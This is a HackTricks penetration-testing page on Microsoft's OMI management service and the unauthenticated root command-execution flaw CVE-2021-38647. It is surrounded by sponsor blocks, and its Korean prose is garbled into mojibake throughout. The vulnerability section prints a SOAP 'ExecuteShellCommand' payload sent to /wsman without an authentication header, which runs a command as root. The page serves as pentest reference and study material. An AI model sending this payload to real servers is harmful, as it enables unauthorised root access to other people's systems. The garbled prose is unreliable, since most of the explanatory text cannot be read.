# 5985,5986 - OMI Pentesting

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

* **ì‚¬ì´ë²„ ë³´ì•ˆ íšŒì‚¬**ì—ì„œ ì¼í•˜ì‹œë‚˜ìš”? **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ **í•˜ê±°ë‚˜ **PEASSì˜ ìµœì‹  ë²„ì „ì— ì•¡ì„¸ìŠ¤**í•˜ê±°ë‚˜ HackTricksë¥¼ **PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•´ë³´ì„¸ìš”!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•´ë³´ì„¸ìš”. ë…ì ì ì¸ [**NFT**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter**ì—ì„œ ì €ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš” ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)ì™€ [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**ì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•´ì£¼ì„¸ìš”.

</details>

### **ê¸°ë³¸ ì •ë³´**

**OMI**ëŠ” Microsoftì—ì„œ ì œê³µí•˜ëŠ” **[ì˜¤í”ˆ ì†ŒìŠ¤](https://github.com/microsoft/omi)** ë„êµ¬ë¡œ, ì›ê²© êµ¬ì„± ê´€ë¦¬ë¥¼ ìœ„í•´ ì„¤ê³„ë˜ì—ˆìŠµë‹ˆë‹¤. íŠ¹íˆ ë‹¤ìŒê³¼ ê°™ì€ ì„œë¹„ìŠ¤ë¥¼ ì‚¬ìš©í•˜ëŠ” Azureì˜ Linux ì„œë²„ì— ì¤‘ìš”í•©ë‹ˆë‹¤:

- **Azure Automation**
- **Azure Automatic Update**
- **Azure Operations Management Suite**
- **Azure Log Analytics**
- **Azure Configuration Management**
- **Azure Diagnostics**

ì´ëŸ¬í•œ ì„œë¹„ìŠ¤ê°€ í™œì„±í™”ë˜ë©´ í”„ë¡œì„¸ìŠ¤ `omiengine`ì´ rootë¡œ ëª¨ë“  ì¸í„°í˜ì´ìŠ¤ì—ì„œ ìˆ˜ì‹  ëŒ€ê¸°í•©ë‹ˆë‹¤.

ì‚¬ìš©ë˜ëŠ” **ê¸°ë³¸ í¬íŠ¸**ëŠ” **5985** (http)ì™€ **5986** (https)ì…ë‹ˆë‹¤.

### **[CVE-2021-38647 ì·¨ì•½ì ](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38647)**

2021ë…„ 9ì›” 16ì¼ì— ê´€ì°°ëœ ë°”ì— ë”°ë¥´ë©´, ì–¸ê¸‰ëœ ì„œë¹„ìŠ¤ë¥¼ ì‚¬ìš©í•˜ëŠ” Azureì— ë°°í¬ëœ Linux ì„œë²„ëŠ” ì·¨ì•½í•œ OMI ë²„ì „ìœ¼ë¡œ ì¸í•´ ì·¨ì•½í•©ë‹ˆë‹¤. ì´ ì·¨ì•½ì ì€ OMI ì„œë²„ê°€ ì¸ì¦ í—¤ë”ë¥¼ í•„ìš”ë¡œí•˜ì§€ ì•ŠëŠ” `/wsman` ì—”ë“œí¬ì¸íŠ¸ë¥¼ í†µí•´ ë©”ì‹œì§€ë¥¼ ì²˜ë¦¬í•  ë•Œ ë°œìƒí•˜ë©°, í´ë¼ì´ì–¸íŠ¸ë¥¼ ì˜ëª» ì¸ì¦í•©ë‹ˆë‹¤.

ê³µê²©ìëŠ” ì¸ì¦ í—¤ë” ì—†ì´ "ExecuteShellCommand" SOAP í˜ì´ë¡œë“œë¥¼ ë³´ë‚´ì–´ ì„œë²„ê°€ root ê¶Œí•œìœ¼ë¡œ ëª…ë ¹ì„ ì‹¤í–‰í•˜ë„ë¡ ìœ ë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```xml
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
...
<s:Body>
<p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
<p:command>id</p:command>
<p:timeout>0</p:timeout>
</p:ExecuteShellCommand_INPUT>
</s:Body>
</s:Envelope>
```
ì´ CVEì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” **[ì—¬ê¸°](https://github.com/horizon3ai/CVE-2021-38647)**ë¥¼ í™•ì¸í•˜ì„¸ìš”.

## ì°¸ê³  ìë£Œ

* [https://www.horizon3.ai/omigod-rce-vulnerability-in-multiple-azure-linux-deployments/](https://www.horizon3.ai/omigod-rce-vulnerability-in-multiple-azure-linux-deployments/)
* [https://blog.wiz.io/omigod-critical-vulnerabilities-in-omi-azure/](https://blog.wiz.io/omigod-critical-vulnerabilities-in-omi-azure/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

* **ì‚¬ì´ë²„ ë³´ì•ˆ íšŒì‚¬**ì—ì„œ ì¼í•˜ì‹œë‚˜ìš”? **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ **í•˜ê±°ë‚˜ **PEASSì˜ ìµœì‹  ë²„ì „ì— ì•¡ì„¸ìŠ¤**í•˜ê±°ë‚˜ **HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter**ì—ì„œ ì €ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš” ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)ì™€ [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**ì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
